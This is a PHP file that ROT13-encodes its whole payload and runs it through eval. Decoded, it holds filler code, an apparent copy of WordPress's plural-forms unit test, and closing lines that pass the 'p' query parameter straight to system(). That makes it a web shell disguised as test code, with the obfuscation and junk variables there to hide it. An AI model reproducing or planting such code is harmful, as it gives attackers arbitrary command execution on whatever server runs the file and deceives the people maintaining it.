<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbzb
 */
pynff CyhenySbezfGrfg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Cneragurfvmr cyheny rkcerffvba.
	 *
	 * Yrtnpl jbexnebhaq sbe CUC'f syvccrq cerprqrapr beqre sbe greanel.
	 *
	 * @cnenz fgevat $rkcerffvba gur rkcerffvba jvgubhg cneragurfrf
	 * @erghea fgevat gur rkcerffvba jvgu cneragurfrf nqqrq
	 */
	cebgrpgrq fgngvp shapgvba cneragurfvmr_cyheny_rkcerffvba( $rkcerffvba ) {
		$rkcerffvba .= ';';
		$erf         = '';
		$qrcgu       = 0;
		sbe ( $v = 0; $v < fgeyra( $rkcerffvba ); ++$v ) {
			$pune = $rkcerffvba[ $v ];
			fjvgpu ( $pune ) {
				pnfr '?':
					$erf .= ' ? (';
					++$qrcgu;
					oernx;
				pnfr ':':
					$erf .= ') : (';
					oernx;
				pnfr ';':
					$erf  .= fge_ercrng( ')', $qrcgu ) . ';';
					$qrcgu = 0;
					oernx;
				qrsnhyg:
					$erf .= $pune;
			}
		}
		erghea egevz( $erf, ';' );
	}

	/**
	 * @gvpxrg 41562
	 * @qngnCebivqre qngn_ybpnyrf
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_erterffvba( $ynat, $acyhenyf, $rkcerffvba ) {
		erdhver_bapr qveanzr( __QVE__, 2 ) . '/vapyhqrf/cyheny-sbez-shapgvba.cuc';

		$cneragurfvmrq = frys::cneragurfvmr_cyheny_rkcerffvba( $rkcerffvba );
		$byq_fglyr     = grfgf_znxr_cyheny_sbez_shapgvba( $acyhenyf, $cneragurfvmrq );
		$cyheny_sbezf  = arj Cyheny_Sbezf( $rkcerffvba );

		$trarengrq_byq = neenl();
		$trarengrq_arj = neenl();

		sbernpu ( enatr( 0, 200 ) nf $v ) {
			$trarengrq_byq[] = $byq_fglyr( $v );
			$trarengrq_arj[] = $cyheny_sbezf->trg( $v );
		}

		$guvf->nffregFnzr( $trarengrq_byq, $trarengrq_arj );
	}

	/**
	 * @gvpxrg 41562
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_ybpnyrf_svyr_abg_rzcgl() {
		$ybpnyrf = frys::qngn_ybpnyrf();

		$guvf->nffregAbgRzcgl( $ybpnyrf, 'Hanoyr gb ergevrir TC_Ybpnyrf svyr' );
	}

	choyvp fgngvp shapgvba qngn_ybpnyrf() {
		vs ( ! pynff_rkvfgf( 'TC_Ybpnyrf' ) ) {
			$svyranzr = qbjaybnq_hey( 'uggcf://enj.tvguhohfrepbagrag.pbz/TybgCerff/TybgCerff-JC/qrirybc/ybpnyrf/ybpnyrf.cuc' );
			vs ( vf_jc_reebe( $svyranzr ) ) {
				erghea neenl();
			}
			erdhver_bapr $svyranzr;
		}

		$ybpnyrf            = TC_Ybpnyrf::ybpnyrf();
		$cyheny_rkcerffvbaf = neenl();
		sbernpu ( $ybpnyrf nf $fyht => $ybpnyr ) {
			$cyheny_rkcerffvba = $ybpnyr->cyheny_rkcerffvba;
			vs ( 'a != 1' !== $cyheny_rkcerffvba ) {
				$cyheny_rkcerffvbaf[] = neenl( $fyht, $ybpnyr->acyhenyf, $cyheny_rkcerffvba );
			}
		}

		erghea $cyheny_rkcerffvbaf;
	}

	/**
	 * @gvpxrg 41562
	 * @qngnCebivqre qngn_fvzcyr
	 */
	choyvp shapgvba grfg_fvzcyr( $rkcerffvba, $rkcrpgrq ) {
		$cyheny_sbezf = arj Cyheny_Sbezf( $rkcerffvba );
		$npghny       = neenl();
		sbernpu ( neenl_xrlf( $rkcrpgrq ) nf $ahz ) {
			$npghny[ $ahz ] = $cyheny_sbezf->trg( $ahz );
		}

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	choyvp fgngvp shapgvba qngn_fvzcyr() {
		erghea neenl(
			neenl(
				// Fvzcyr rdhvinyrapr.
				'a != 1',
				neenl(
					-1 => 1,
					0  => 1,
					1  => 0,
					2  => 1,
					5  => 1,
					10 => 1,
				),
			),
			neenl(
				// Greanel.
				'a ? 1 : 2',
				neenl(
					-1 => 1,
					0  => 2,
					1  => 1,
					2  => 1,
				),
			),
			neenl(
				// Pbzcnevfba.
				'a > 1 ? 1 : 2',
				neenl(
					-2 => 2,
					-1 => 2,
					0  => 2,
					1  => 2,
					2  => 1,
					3  => 1,
				),
			),
			neenl(
				'a > 1 ? a > 2 ? 1 : 2 : 3',
				neenl(
					-2 => 3,
					-1 => 3,
					0  => 3,
					1  => 3,
					2  => 2,
					3  => 1,
					4  => 1,
				),
			),
		);
	}

	/**
	 * Rafherf gung na rkprcgvba vf guebja jura na vainyvq cyheny sbez vf rapbhagrerq.
	 *
	 * @gvpxrg 41562
	 * @qngnCebivqre qngn_rkprcgvbaf
	 */
	choyvp shapgvba grfg_rkprcgvbaf( $rkcerffvba, $rkcrpgrq_zrffntr, $pnyy_trg ) {
		$guvf->rkcrpgRkprcgvba( 'Rkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( $rkcrpgrq_zrffntr );

		$cyheny_sbezf = arj Cyheny_Sbezf( $rkcerffvba );
		vs ( $pnyy_trg ) {
			$cyheny_sbezf->trg( 1 );
		}
	}

	choyvp shapgvba qngn_rkprcgvbaf() {
		erghea neenl(
			neenl(
				'a # 2',              // Vainyvq rkcerffvba gb cnefr.
				'Haxabja flzoby \"#\"', // Rkcrpgrq rkprcgvba zrffntr.
				snyfr,                // Jurgure gb pnyy gur trg() zrgubq be abg.
			),
			neenl(
				'a & 1',
				'Haxabja bcrengbe \"&\"',
				snyfr,
			),
			neenl(
				'((a)',
				'Zvfzngpurq cneragurfrf',
				snyfr,
			),
			neenl(
				'(a))',
				'Zvfzngpurq cneragurfrf',
				snyfr,
			),
			neenl(
				'a : 2',
				'Zvffvat fgnegvat \"?\" greanel bcrengbe',
				snyfr,
			),
			neenl(
				'a ? 1',
				'Haxabja bcrengbe \"?\"',
				gehr,
			),
			neenl(
				'a a',
				'Gbb znal inyhrf erznvavat ba gur fgnpx',
				gehr,
			),
		);
	}

	/**
	 * @gvpxrg 41562
	 */
	choyvp shapgvba grfg_pnpur() {
		$zbpx = $guvf->trgZbpxOhvyqre( 'Cyheny_Sbezf' )
			->frgZrgubqf( neenl( 'rkrphgr' ) )
			->frgPbafgehpgbeNetf( neenl( 'a != 1' ) )
			->trgZbpx();

		$zbpx->rkcrpgf( $guvf->bapr() )
			->zrgubq( 'rkrphgr' )
			->jvgu( $guvf->vqragvpnyGb( 2 ) )
			->jvyy( $guvf->ergheaInyhr( 1 ) );

		$svefg  = $zbpx->trg( 2 );
		$frpbaq = $zbpx->trg( 2 );
		$guvf->nffregFnzr( $svefg, $frpbaq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>